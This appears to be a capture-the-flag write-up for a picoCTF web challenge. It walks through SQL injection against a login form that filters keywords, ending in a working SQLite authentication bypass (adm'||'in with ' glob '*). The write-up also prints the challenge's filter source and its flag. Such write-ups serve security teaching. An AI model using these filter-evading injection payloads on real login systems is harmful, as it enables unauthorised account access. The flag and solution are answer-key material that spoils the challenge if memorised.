# Overview 
Category: [Web Exploitation]()

AUTHOR: MADSTACKS

# Description
This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:46322/
Filter: http://mercury.picoctf.net:46322/filter.php

# Solution
- First, check the filter of the website:
http://mercury.picoctf.net:46322/filter.php
```
Filters: or and true false union like = > < ; -- /* */ admin
```
- I try to enter the username = 'test' and password = '123'. And I know the query
```bash
SELECT username, password FROM users WHERE username='test' AND password='123'
```
- We want to login as admin, but entering admin as plaintext gets blocked. The easy bypass is to use || for concatenation and send ad'||'min as the username:
```bash
SELECT username, password FROM users WHERE username='ad'||'min' AND password='123' 
```
- However, we still need to somehow neutralize the password check. The except keyword should be able to do that, so by sending
```bash
SELECT username, password FROM users WHERE username='ad'||'min'  except select username, password from users where username='' AND password='123' 
```
The `EXCEPT` statement in SQL is used to return the rows from the first query that do not exist in the second query.

- However, this query is blocked due to a new constraint:
`Combined input lengths too long! (> 35)`
- I tried changing :`select username, password from users` to `select * from users` . But the result is still the same
- Finally I tried the query
```bash
SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*' 
```
In SQL statements, using `glob '*'` with a condition may return all results without needing to match the condition exactly.
However, `glob` is not standard SQL syntax; it typically appears in file systems or specific database management systems like SQLite, where it is used for pattern matching.
Generally
```
username: adm'||'in
password: ' glob '*
```
- Once we were able to bypass the authentication query, we got the following response from the server:
http://mercury.picoctf.net:46322/filter.php
```php
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_9605a246c21764e7691ca04679ad321a}
?>
```

> Flag : **picoCTF{0n3_m0r3_t1m3_9605a246c21764e7691ca04679ad321a}**